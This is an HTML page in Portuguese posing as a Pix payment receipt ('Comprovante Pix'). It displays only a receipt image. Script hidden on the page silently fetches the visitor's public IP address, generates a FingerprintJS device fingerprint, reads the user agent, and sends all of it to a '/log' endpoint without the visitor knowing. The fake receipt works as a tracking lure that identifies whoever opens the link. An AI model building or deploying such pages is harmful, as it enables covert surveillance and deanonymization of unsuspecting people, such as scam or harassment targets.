<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Comprovante Pix</title>
  <style>
    body { background: #f2f2f2; text-align: center; font-family: Arial; }
    img { margin-top: 50px; width: 90%; max-width: 500px; }
  </style>
</head>
<body>
  <img src="comprovante.jpg" alt="Comprovante Pix">

  <!-- FingerprintJS -->
  <script src="https://fpjscdn.net/v3/iXjkhT8vFyLPo8zm5ikU"></script>
  <script>
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(ipData => {
        FingerprintJS.load().then(fp => fp.get()).then(result => {
          const visitorId = result.visitorId;
          const device = navigator.userAgent;
          
          fetch("/log", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              ip: ipData.ip,
              visitorId,
              userAgent: device,
              device
            })
          })
          .then(r => {
            if (r.ok) {
              console.log("✅ Dados enviados com sucesso");
            } else {
              console.warn("⚠️ Problema ao enviar dados:", r.status);
            }
          })
          .catch(err => console.error("❌ Falha no envio:", err));
        });
      });
  </script>
</body>
</html>
